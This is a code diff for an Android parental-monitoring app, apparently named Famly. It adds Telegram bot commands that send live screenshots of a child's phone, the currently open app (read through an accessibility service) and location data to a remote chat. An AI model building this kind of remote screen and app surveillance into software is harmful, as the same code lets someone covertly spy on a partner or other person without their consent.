@@ -5,6 +5,7 @@ import android.content.SharedPreferences
 import android.util.Log
 import com.example.data.location.LocationHelper
 import com.example.data.scanner.NetworkScanner
+import com.example.service.FamlyAccessibilityService
 import com.example.utils.ScreenshotHelper
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -303,16 +304,20 @@ class TelegramBotManager(private val context: Context) {
                 }
             }
             "/screenshot", "/ss", "/layar", "/tangkap_layar" -> {
+                val activeAppSummary = FamlyAccessibilityService.getActiveAppSummary()
                 executeSendMessage(
                     token,
                     chatId,
-                    "📸 <b>[Screenshot] Mengambil tangkapan layar HP anak...</b>\n<i>Mohon tunggu sebentar.</i>"
+                    "📸 <b>[Screenshot] Mengambil tangkapan layar real-time...</b>\n" +
+                            "$activeAppSummary\n\n" +
+                            "<i>Mohon tunggu sebentar...</i>"
                 )
 
                 ScreenshotHelper.captureScreenshot(context) { photoBytes ->
                     if (photoBytes != null && photoBytes.isNotEmpty()) {
                         CoroutineScope(Dispatchers.IO).launch {
-                            val caption = "📸 <b>[Famly] Tangkapan Layar Perangkat</b>\n\n🕒 <i>Waktu: $timeStr</i>"
+                            val caption = "📸 <b>[Famly] Tangkapan Layar Real-time</b>\n" +
+                                    "$activeAppSummary\n🕒 <i>Waktu: $timeStr</i>"
                             val sent = sendPhoto(photoBytes, caption, chatId)
                             if (!sent) {
                                 executeSendMessage(token, chatId, "⚠️ <b>Gagal mengirim foto screenshot ke Telegram.</b>")
@@ -323,10 +328,17 @@ class TelegramBotManager(private val context: Context) {
                     }
                 }
             }
+            "/app", "/aplikasi", "/buka" -> {
+                val activeAppSummary = FamlyAccessibilityService.getActiveAppSummary()
+                val isAccessActive = if (FamlyAccessibilityService.isServiceActive) "🟢 Aktif" else "🔴 Belum Diaktifkan"
+                val text = "🔍 <b>[Pemantauan Aplikasi Real-time]</b>\n\n$activeAppSummary\n\n⚙️ <i>Status Layanan Aksesibilitas: $isAccessActive</i>"
+                executeSendMessage(token, chatId, text)
+            }
             "/start", "/help" -> {
                 val replyMsg = "👋 <b>Selamat Datang di Bot Famly!</b>\n\n" +
                         "Perintah yang dapat Anda gunakan:\n" +
-                        "• <code>/screenshot</code> - Tangkap gambar layar HP anak secara langsung\n" +
+                        "• <code>/screenshot</code> - Tangkap gambar layar HP anak secara langsung (real-time)\n" +
+                        "• <code>/app</code> - Cek aplikasi apa yang sedang dibuka anak saat ini\n" +
                         "• <code>/lokasi</code> - Meminta koordinat GPS & peta lokasi terkini anak\n" +
                         "• <code>/scan</code> - Meminta pemindaian jaringan Wi-Fi & Bluetooth di sekitar\n" +
                         "• <code>/ping</code> - Cek status koneksi bot & GPS HP anak\n" +
